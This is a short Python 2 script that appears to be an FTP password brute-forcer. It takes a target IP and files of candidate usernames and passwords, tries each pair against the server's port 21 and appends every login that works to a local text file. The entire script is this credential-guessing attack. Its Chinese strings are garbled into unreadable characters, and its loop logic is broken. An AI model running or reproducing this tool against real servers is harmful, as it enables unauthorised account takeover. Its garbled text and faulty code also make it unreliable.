#-*-coding:utf-8-*-
import time
import sys
# -*- coding: utf-8 -*-  


'''

z = zipfile.ZipFile('') , extractall

z.extractall(pwd)

'''

from ftplib import FTP
import ftplib
import threading
 

def ftp(user,pwd,host,start):

        try:
		
		ftp = ftplib.FTP()
                ftp.connect(host, 21, 9)
               	ftp.login(user, pwd)
                ftp.retrlines('LIST')
                ftp.quit()
                print '\n[+] �ƽ�ɹ����û�����' + user + ' ���룺' + pwd+' ip: '+host

		fd=open('���ܼ�¼.txt','a')
		fd.write("\nftp://"+host+"\t�û�����"+user+"\t���룺"+pwd)
		fd.flush()
		fd.close()
		end = time.clock()
		print "�ƽ���ʱ : %f s" % (end - start)
		print "�����ƽ��¼�Ѿ����浽���ļ��С����ܼ�¼.txt��"
       		return True,'ftp password is '+user+':'+pwd		

        except ftplib.all_errors:

                return

def main():

	host = raw_input("������ftp����ip��")
	user = raw_input("�������û����ֵ�·�����磺C:\\file.zip��")
	pass1 = raw_input("�����������ֵ�·�����磺C:\\file.zip��")

	
	print '�����ƽ�...'

        pwdall = open(pass1)
        userll = open(user)
	start = time.clock()

	for use in userll.readlines():

		user1 =use.strip('\n')
        	for pwda in pwdall.readlines():
			pwd = pwda.strip('\n')

	                t = threading.Thread(target=ftp, args=(user1,pwd,host,start))

	                t.start()

	                t.join()

if __name__ == '__main__':

        main()